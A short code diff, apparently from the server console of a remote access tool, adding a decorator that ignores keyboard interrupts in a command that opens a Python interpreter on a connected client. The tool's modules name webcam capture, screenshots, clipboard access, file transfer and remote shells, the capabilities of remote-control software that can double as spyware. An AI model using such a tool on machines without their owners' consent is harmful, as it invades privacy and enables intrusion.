@@ -8,7 +8,7 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from modules import (clipboard, download, filetransfer, screenshot,
                      shells, tasks, webcam, windows, helpers)
 from modules.baseserver import Server
-from utils import terminal
+from utils import terminal, ignore
 from utils.timeout_handler import timeoutsetter
 
 # Enables using arrowkeys on unix-like systems
@@ -174,6 +174,7 @@ class ServerCLI(Server, cmd.Cmd):
                 with timeoutsetter(self.client, None):
                     print(self.client.read().decode(), end="")
 
+    @ignore.keyboardinterrupt
     def do_python(self, _) -> None:
         """ Open a python interpreter to client """
         if self.__check_select():
